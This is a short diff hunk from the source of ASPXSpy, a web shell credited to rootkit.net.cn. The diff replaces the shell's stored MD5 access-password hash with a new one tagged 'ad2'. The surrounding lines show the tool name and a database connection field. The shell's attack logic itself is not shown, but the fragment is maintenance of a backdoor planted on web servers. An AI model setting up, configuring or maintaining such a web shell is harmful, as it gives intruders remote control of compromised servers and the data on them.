@@ -27,7 +27,7 @@ Make in China
 Blog: http://www.rootkit.net.cn
 E-mail : master@rootkit.net.cn
 */
-public string Password="d36c71408784d8123de29768f24df75e";
+public string Password="c84258e9c39059a89ab77d846ddab909";//ad2
 public string vbhLn="ASPXSpy";
 public int TdgGU=1;
 protected OleDbConnection Dtdr=new OleDbConnection();
